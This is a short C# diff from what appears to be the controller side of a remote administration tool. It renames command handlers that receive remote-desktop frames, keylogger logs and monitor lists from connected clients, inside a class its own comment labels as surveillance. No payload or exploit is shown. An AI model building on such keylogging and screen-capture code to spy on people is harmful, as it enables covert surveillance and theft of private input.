@@ -11,7 +11,7 @@ namespace xServer.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
-        public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
+        public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
             if (client.Value.FrmRdp == null)
                 return;
@@ -120,7 +120,7 @@ namespace xServer.Core.Commands
             }).Start();
         }
 
-        public static void HandleGetLogsResponse(Client client, GetLogsResponse packet)
+        public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
         {
             if (client.Value.FrmKl == null)
                 return;
@@ -168,7 +168,7 @@ namespace xServer.Core.Commands
             }
         }
 
-        public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
+        public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
         {
             if (client.Value.FrmRdp == null)
                 return;
